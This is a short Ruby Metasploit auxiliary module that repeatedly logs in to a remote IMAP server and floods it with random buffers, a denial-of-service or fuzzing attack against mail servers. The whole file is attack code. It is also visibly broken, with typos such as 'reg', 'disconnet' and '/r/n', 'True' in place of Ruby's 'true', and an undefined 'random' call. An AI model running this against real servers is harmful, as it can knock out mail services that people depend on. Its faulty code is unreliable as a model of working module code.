require 'msf/core'

#This exploit tries to send buffer to the  remote IMAP

class Exploit1 < Msf::Auxiliary
include  Msf:: Auxiliary::Dos
include Msf::Exploit::Remote::IMAP


def rannum
 return Rex::Text.random_alphanumeric(random(1024)) 
end
 
def run
 srand(0)
 
#get connect. If not connected tell the user and finish 

while(True)
 connected=connect_login()
 if not connected
   print_status("Host is unreachable")
   break
 end
 print_status('Generating data...')
 buffer=rannum()
 req=buffer+"success"+"/r/n"
 raw_send(req);
 res=raw_send_recv(reg)
 
 if !res.nil?
  print_status(res)
 else
  print_status('no response from server')
  break
 end
 #when you are done
 disconnet()
 end
 end
 end